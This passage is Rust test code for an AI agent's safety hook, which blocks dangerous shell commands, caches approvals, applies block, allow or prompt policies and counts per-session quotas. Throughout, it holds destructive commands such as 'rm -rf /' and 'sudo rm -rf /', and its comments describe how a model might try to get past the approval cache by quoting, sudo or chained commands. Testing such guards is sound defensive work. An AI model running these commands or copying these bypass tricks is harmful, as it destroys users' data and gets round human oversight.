                .any(|o| o.key == 'y' && matches!(o.kind, OptionKind::Primary))
        );
        assert!(
            pause
                .options
                .iter()
                .any(|o| o.key == 'n' && matches!(o.kind, OptionKind::Destructive))
        );

        // Drain the task with a deny so the spawned future doesn't leak.
        pause.reply.send(AgentResume::Deny).ok();
        let _ = task.await;
    }

    #[tokio::test]
    async fn approval_cache_bypasses_block() {
        let hook = SafetyHook::new();
        let dangerous = "rm -rf /";
        let args = serde_json::json!({ "command": dangerous });
        let cancel = CancellationToken::new();

        // First call blocks
        match hook
            .before_tool_call("bash", &args, cancel.clone())
            .await
            .unwrap()
        {
            HookOutcome::Block { .. } => {}
            other => panic!("expected Block, got {other:?}"),
        }

        // Approve it
        hook.approve(dangerous);

        // Second call passes
        match hook
            .before_tool_call("bash", &args, cancel.clone())
            .await
            .unwrap()
        {
            HookOutcome::Continue => {}
            other => panic!("expected Continue, got {other:?}"),
        }
    }

    // ── YYC-130: canonical-key approval cache ───────────────────────────

    #[test]
    fn canonical_key_normalizes_whitespace() {
        // Extra spaces / tabs between tokens shouldn't produce distinct
        // cache entries — each is the same dangerous command.
        assert_eq!(
            canonical_command_key("rm -rf /"),
            canonical_command_key("rm  -rf  /"),
        );
        assert_eq!(
            canonical_command_key("rm -rf /"),
            canonical_command_key("rm\t-rf\t/"),
        );
    }

    #[test]
    fn canonical_key_strips_equivalent_quoting() {
        // YYC-130: approving `rm -rf /` should also cover `rm -rf "/"`
        // (and `rm -rf '/'`) because the tokenizer drops quote chars —
        // a model can't bypass the cache by quoting the target.
        assert_eq!(
            canonical_command_key("rm -rf /"),
            canonical_command_key(r#"rm -rf "/""#),
        );
        assert_eq!(
            canonical_command_key("rm -rf /"),
            canonical_command_key("rm -rf '/'"),
        );
    }

    #[test]
    fn canonical_key_keeps_sudo_distinct() {
        // YYC-130 acceptance: sudo prefix doesn't bypass — approving
        // `rm -rf /tmp` must NOT authorize `sudo rm -rf /tmp` (different
        // privilege model).
        assert_ne!(
            canonical_command_key("rm -rf /tmp"),
            canonical_command_key("sudo rm -rf /tmp"),
        );
        assert_ne!(
            canonical_command_key("rm -rf /tmp"),
            canonical_command_key("doas rm -rf /tmp"),
        );
    }

    #[test]
    fn canonical_key_keeps_target_paths_distinct() {
        // Different target paths must produce different keys so
        // approving a scoped delete doesn't authorize a root delete.
        assert_ne!(
            canonical_command_key("rm -rf /etc/old"),
            canonical_command_key("rm -rf /"),
        );
        assert_ne!(
            canonical_command_key("rm -rf /tmp/foo"),
            canonical_command_key("rm -rf /tmp/foo/.."),
        );
    }

    #[test]
    fn canonical_key_keeps_pipeline_segments_distinct() {
        // Approving `cd /tmp` must NOT authorize `cd /tmp && rm -rf /`
        // — the pipeline operator is a token that survives normalization.
        assert_ne!(
            canonical_command_key("cd /tmp"),
            canonical_command_key("cd /tmp && rm -rf /"),
        );
    }

    #[tokio::test]
    async fn approval_cache_treats_quoted_target_as_same_command() {
        // Pin behavior: approve once, then a quoted variant lands in
        // the cache without re-prompting the user.
        let hook = SafetyHook::new();
        hook.approve("rm -rf /");

        let args = serde_json::json!({ "command": r#"rm -rf "/""# });
        let outcome = hook
            .before_tool_call("bash", &args, CancellationToken::new())
            .await
            .unwrap();
        assert!(matches!(outcome, HookOutcome::Continue));
    }

    #[tokio::test]
    async fn approval_cache_does_not_authorize_sudo_variant() {
        // YYC-130: approving the unsudo'd command must not silently
        // authorize the sudo'd one.
        let hook = SafetyHook::new();
        hook.approve("rm -rf /");

        let args = serde_json::json!({ "command": "sudo rm -rf /" });
        let outcome = hook
            .before_tool_call("bash", &args, CancellationToken::new())
            .await
            .unwrap();
        assert!(matches!(outcome, HookOutcome::Block { .. }));
    }

    // ── YYC-130: pty_write interception ─────────────────────────────────

    #[tokio::test]
    async fn pty_write_with_dangerous_command_blocks_without_pause_emitter() {
        // YYC-130: PTY stdin route must go through the same safety
        // check as the bash tool. Without a pause emitter the hook
        // hard-blocks (matches the bash-tool behavior).
        let hook = SafetyHook::new();
        let args = serde_json::json!({
            "session_id": "x",
            "input": "rm -rf /\n",
        });
        let outcome = hook
            .before_tool_call("pty_write", &args, CancellationToken::new())
            .await
            .unwrap();
        assert!(matches!(outcome, HookOutcome::Block { .. }));
    }

    #[tokio::test]
    async fn pty_write_with_safe_input_continues() {
        // Sanity check: regular keystrokes / typing into a PTY shouldn't
        // be intercepted.
        let hook = SafetyHook::new();
        let args = serde_json::json!({
            "session_id": "x",
            "input": "ls\n",
        });
        let outcome = hook
            .before_tool_call("pty_write", &args, CancellationToken::new())
            .await
            .unwrap();
        assert!(matches!(outcome, HookOutcome::Continue));
    }

    #[tokio::test]
    async fn pty_write_empty_input_continues() {
        // Empty / pure-whitespace stdin should not engage the matcher.
        let hook = SafetyHook::new();
        let args = serde_json::json!({
            "session_id": "x",
            "input": "\n",
        });
        let outcome = hook
            .before_tool_call("pty_write", &args, CancellationToken::new())
            .await
            .unwrap();
        assert!(matches!(outcome, HookOutcome::Continue));
    }

    // ── YYC-130 follow-up: policy + per-session quota ───────────────────

    #[tokio::test]
    async fn policy_block_rejects_even_remembered_commands() {
        // policy = block: dangerous patterns are hard-blocked regardless
        // of the approval cache. Useful for unattended / CI runs.
        let hook = SafetyHook::with_config(
            None,
            DangerousCommandsConfig {
                policy: DangerousCommandPolicy::Block,
                quota_per_session: 0,
            },
        );
        hook.approve("rm -rf /"); // pre-seed the cache

        let args = serde_json::json!({ "command": "rm -rf /" });
        let outcome = hook
            .before_tool_call("bash", &args, CancellationToken::new())
            .await
            .unwrap();
        assert!(
            matches!(outcome, HookOutcome::Block { reason } if reason.contains("policy = block"))
        );
    }

    #[tokio::test]
    async fn policy_allow_lets_dangerous_commands_run_without_prompt() {
        // policy = allow: matcher fires (and warn-logs), but the call
        // is allowed through with no pause emitter required. **Not**
        // recommended — surface area for the docs.
        let hook = SafetyHook::with_config(
            None,
            DangerousCommandsConfig {
                policy: DangerousCommandPolicy::Allow,
                quota_per_session: 0,
            },
        );
        let args = serde_json::json!({ "command": "rm -rf /" });
        let outcome = hook
            .before_tool_call("bash", &args, CancellationToken::new())
            .await
            .unwrap();
        assert!(matches!(outcome, HookOutcome::Continue));
    }

    #[tokio::test]
    async fn quota_reprompts_after_cap_is_reached() {
        // Quota = 2: the first two fires of an approved command run;
        // the third fire finds the entry, sees the quota is exhausted,
        // forgets it, and falls through to the prompt path. With no
        // pause emitter that path hard-blocks — proving the cache
        // entry was actually dropped.
        let hook = SafetyHook::with_config(
            None,
            DangerousCommandsConfig {
                policy: DangerousCommandPolicy::Prompt,
                quota_per_session: 2,
            },
        );
        hook.approve("rm -rf /etc/old");

        let args = serde_json::json!({ "command": "rm -rf /etc/old" });

        for run in 1..=2 {
            let outcome = hook
                .before_tool_call("bash", &args, CancellationToken::new())
                .await
                .unwrap();
            assert!(
                matches!(outcome, HookOutcome::Continue),
                "run {run} should still be within quota"
            );
        }

        let third = hook
            .before_tool_call("bash", &args, CancellationToken::new())
            .await
            .unwrap();
        assert!(
            matches!(third, HookOutcome::Block { .. }),
            "third run should re-prompt and (with no pause emitter) block"
        );
    }

    #[tokio::test]
    async fn quota_zero_disables_cap() {
        // quota_per_session = 0 mirrors the legacy behavior: once
        // approved, runs unlimited.
        let hook = SafetyHook::with_config(
            None,
            DangerousCommandsConfig {
                policy: DangerousCommandPolicy::Prompt,
                quota_per_session: 0,
            },
        );
        hook.approve("rm -rf /etc/old");

        let args = serde_json::json!({ "command": "rm -rf /etc/old" });
        for _ in 0..10 {
            let outcome = hook
                .before_tool_call("bash", &args, CancellationToken::new())
                .await
                .unwrap();
            assert!(matches!(outcome, HookOutcome::Continue));
        }
    }
}
